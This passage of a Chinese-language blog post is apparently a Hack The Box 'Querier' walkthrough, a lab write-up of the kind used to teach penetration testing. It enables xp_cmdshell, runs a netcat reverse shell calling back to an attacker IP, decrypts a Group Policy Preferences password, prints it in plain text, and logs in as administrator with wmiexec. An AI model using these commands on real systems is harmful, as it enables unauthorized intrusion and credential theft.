+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1 </span><br><span class="line">GO </span><br><span class="line">RECONFIGURE </span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,1 </span><br><span class="line">GO</span><br><span class="line">RECONFIGURE </span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+<p>在 mssqlclient 中已经内置命令来运行 xp_cmdshell，我们只需要直接开启该参数即可，经过实践当前用户也有权限启动该命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; enable_xp_cmdshell </span><br><span class="line">SQL &gt; xp_cmdshell whoami</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.27.50.png" alt="截屏2021-12-03 下午4.27.50"><br>结果吸纳是命令已经成功执行，我们可以通过 smb 协议来上传 nc64.exe 并执行反弹shell，首先在开启 smb 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -smb2support mac ~/hackthebox/Machines/Querier</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.34.11.png" alt="截屏2021-12-03 下午4.34.11"><br>在本地监听443端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 443</span><br></pre></td></tr></table></figure>
+<p>在数据库当中执行命令反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; xp_cmdshell \\10.10.14.5\mac\nc64.exe -e cmd.exe 10.10.14.5 443</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.48.37.png" alt="截屏2021-12-03 下午4.48.37"></p>
+<p>成功拿到反弹shell，在当前用户桌面上寻找flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\mssql-svc\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\mssql-svc\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.49.18.png" alt="截屏2021-12-03 下午4.49.18"><br>成功获取第一个flag</p>
+<h2 id="0x03-权限提升-administrator"><a href="#0x03-权限提升-administrator" class="headerlink" title="0x03 权限提升[administrator]"></a>0x03 权限提升[administrator]</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>PowerUp.ps1</code>可以帮助我们来枚举目标系统信息，开始使用 powershell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br></pre></td></tr></table></figure>
+<p>进入<code>\temp</code>目录并将<code>PowerUp.ps1</code>复制到到其中，导入 PowerUp 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\mssql-svc\appdata\<span class="built_in">local</span>\temp</span><br><span class="line">xcopy \\10.10.14.5\mac\PowerUp.ps1  .</span><br><span class="line">. .\PowerUp.ps1</span><br><span class="line">Invoke-ALLChecks</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.57.40.png" alt="截屏2021-12-03 下午4.57.40"><br>但是无法导入 PowerUp，我们还是需要依靠手工寻找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\ProgramData\Microsoft\Group Policy\History&quot;</span></span><br><span class="line">dir</span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;&quot;</span></span><br><span class="line">dir</span><br><span class="line"><span class="built_in">cd</span> Machine\Preferences\Groups</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.01.08.png" alt="截屏2021-12-03 下午5.01.08"><br>也可以直接访问以下路径找到对应的组策略密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\ProgramData\Microsoft\Group Policy\History\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Machine\Perferences\Groups&quot;</span></span><br><span class="line"><span class="built_in">type</span> Groups.xml</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.48.28.png" alt="截屏2021-12-04 下午3.48.28"><br>找到管理员的组策略密码并使用 gpp-decrypt 进行解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.54.10.png" alt="截屏2021-12-04 下午3.54.10"><br>成功破解密码为<code>MyUnclesAreMarioAndLuigi!!1!</code></p>
+<h3 id="上线管理员"><a href="#上线管理员" class="headerlink" title="上线管理员"></a>上线管理员</h3><p>使用 wmiexec.py 上线管理员</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py <span class="string">&#x27;Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.56.08.png" alt="截屏2021-12-04 下午3.56.08"></p>
+<p>成功登录后在管理员桌面上寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.56.50.png" alt="截屏2021-12-04 下午3.56.50">成功获取第二个flag</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/2b6b41bb/">HTB: Sizzle<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
